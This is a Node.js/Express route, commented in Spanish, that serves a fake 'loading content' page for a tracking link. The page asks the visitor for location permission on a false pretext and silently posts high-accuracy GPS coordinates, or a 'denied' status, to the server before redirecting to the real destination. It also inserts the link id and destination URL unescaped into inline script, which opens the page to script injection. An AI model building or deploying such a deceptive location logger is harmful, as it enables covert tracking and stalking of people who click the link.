/**
 * 2. Servir página para captura GPS de alta precisión
 */
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;

  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');

  try {
    const { data: linkRecord, error } = await supabase
      .from('tracking_links')
      .select('target_url')
      .eq('id', id)
      .single();

    if (error || !linkRecord) {
      return res.redirect(302, 'https://google.com');
    }

    const destination = linkRecord.target_url;

    const html = `
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Cargando...</title>
        <style>
          body { font-family: system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f8fafc; color: #334155; }
          .card { text-align: center; padding: 2rem; background: white; border-radius: 12px; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); max-width: 90%; }
          .spinner { border: 3px solid #e2e8f0; border-top: 3px solid #2563eb; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 1rem auto; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
      </head>
      <body>
        <div class="card">
          <h3>Cargando contenido</h3>
          <p>Por favor, confirma los permisos de ubicación para continuar...</p>
          <div class="spinner"></div>
        </div>

        <script>
          const trackingId = "${id}";
          const destination = "${destination}";

          async function sendPayload(payload) {
            try {
              await fetch('/api/submit-gps', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ link_id: trackingId, ...payload }),
                keepalive: true
              });
            } catch (e) {
              console.error(e);
            } finally {
              window.location.href = destination;
            }
          }

          if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                sendPayload({
                  status: 'granted',
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy
                });
              },
              (err) => {
                sendPayload({
                  status: 'denied'
                });
              },
              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
          } else {
            window.location.href = destination;
          }
        </script>
      </body>
      </html>
    `;

    return res.send(html);

  } catch (err) {
    console.error('Error en /r/:id:', err.message);
    return res.redirect(302, 'https://google.com');
  }
});
